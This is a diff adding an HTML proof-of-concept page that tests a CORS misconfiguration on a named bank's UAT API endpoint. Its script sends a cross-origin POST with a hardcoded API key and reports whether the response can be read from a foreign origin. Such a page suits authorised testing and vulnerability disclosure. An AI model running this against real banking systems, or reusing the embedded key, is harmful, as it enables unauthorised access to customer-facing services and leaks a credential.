@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h2>CORS Misconfiguration PoC — CDB Internet Banking</h2>
+  <p>Target: <code>https://uat.self.lk/mb/auth/api/v1/splash/</code></p>
+  <button onclick="testCORS()">Run CORS Test</button>
+  <hr>
+  <h3>Result:</h3>
+  <pre id="result">Click the button to test...</pre>
+
+  <script>
+    function testCORS() {
+      document.getElementById('result').innerText = 'Sending request...';
+
+      fetch('https://uat.self.lk/mb/auth/api/v1/splash/', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'text/plain',
+          'X-Api-Key': 'yX8e4IujIwuWXGYvposamglY0p5H3pq95iq6zyId'
+        },
+        body: 'test'
+      })
+      .then(response => {
+        return response.text().then(data => {
+          document.getElementById('result').innerText =
+            '✅ CORS VULNERABILITY CONFIRMED\n\n' +
+            'Status: ' + response.status + '\n' +
+            'This page origin: ' + window.location.origin + '\n' +
+            'Target origin: https://uat.self.lk\n\n' +
+            'Response data readable from foreign origin:\n' +
+            data.substring(0, 300) + '...';
+        });
+      })
+      .catch(error => {
+        document.getElementById('result').innerText =
+          '❌ Request blocked by browser\n' + error;
+      });
+    }
+  </script>
+</body>
+</html>
